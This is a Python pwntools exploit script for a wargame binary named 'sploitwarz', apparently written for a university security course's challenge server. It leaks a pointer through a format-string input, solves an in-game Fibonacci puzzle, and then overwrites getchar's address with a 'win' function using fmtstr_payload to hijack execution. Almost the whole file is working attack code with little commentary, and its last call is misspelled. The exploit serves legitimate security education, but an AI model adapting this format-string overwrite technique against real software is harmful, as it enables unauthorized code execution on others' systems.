#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./sploitwarz --host wargames.6447.sec.edu.au --port 7003
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sploitwarz')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'wargames.6447.sec.edu.au'
port = int(args.PORT or 7003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
def is_fibonacci(n):
    phi = 0.5 + 0.5 * math.sqrt(5.0)
    a = phi * n
    return n == 0 or abs(round(a) - a) < 1.0 / n

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()
io.recvuntil("handle?")
payload1="%08x"
io.sendline(payload1)
io.recvuntil("What will you do?")
io.sendline("g")
io.recvuntil("):")
io.sendline("1")
io.recvuntil("Pick the odd one out:")
values=[]
for i in range(6):
	a=io.recvline()
	a=a[3:]
	a=a.rstrip()
	a=a.lstrip()
	try:
		values.append(int(a))
	except ValueError:
		pass
#print values

for i in range(5):
	if not is_fibonacci(values[i]):
		#print "Sending", i+1
		io.sendline(str(i+1))
io.recvline()
memory_line= io.recvline()
#print memory_line
io.sendline("s")
memory= memory_line[11:19]
memory = '0x'+memory
#print "Memory:",memory
getchar=int('0x218',16)
win=int('0x3978',16)
memory=int(memory,16)
first=memory-getchar
second=memory-win
#print "getchar: ",hex(first),"win: ",hex(second)
#{Address location to write at:new address location}
payload2=fmtstr_payload(9,{first:second},0, 'byte')
print payload2
print io.recvuntil("do?")
io.sendline("c")
print io.recvuntil("do?")
io.sendline("c")
io.recvuntil("handle?")
io.sendline(payload2)
io.recvuntil("do?")
io.sendline("g")
io.recvuntil("):")
io.sendline("1")
io.recvuntil("Pick the odd one out:")
values=[]
for i in range(6):
	a=io.recvline()
	a=a[3:]
	a=a.rstrip()
	a=a.lstrip()
	try:
		values.append(int(a))
	except ValueError:
		pass
#print values
for i in range(5):
	if not is_fibonacci(values[i]):
		#print "Sending", i+1
		io.sendline(str(i+1))
io.recvline()
io.recvline()
io.recvline()
print io.recvline()
io.recvline()
io.recvline()
pause()
io.interative()
